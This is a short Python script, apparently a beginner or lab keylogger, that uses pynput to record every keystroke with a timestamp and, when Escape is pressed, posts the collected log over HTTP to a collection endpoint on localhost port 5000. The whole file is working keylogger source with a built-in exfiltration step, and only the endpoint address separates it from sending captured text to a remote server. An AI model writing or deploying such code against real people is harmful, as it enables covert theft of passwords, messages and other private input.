from pynput import keyboard
import requests
import time

log_data = ""

def on_press(key):
    global log_data
    timestamp = time.ctime()
    try:
        log_data += f"{timestamp} - {key.char}\n"
    except AttributeError:
        log_data += f"{timestamp} - [{key}]\n"

def on_release(key):
    if key == keyboard.Key.esc:
        print("it should be sended")
        try:
            requests.post("http://localhost:5000/log", data=log_data)
            print("[*] Logs sent.")
        except Exception as e:
            print(f"error : {e}")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("stop with escape")
    listener.join()
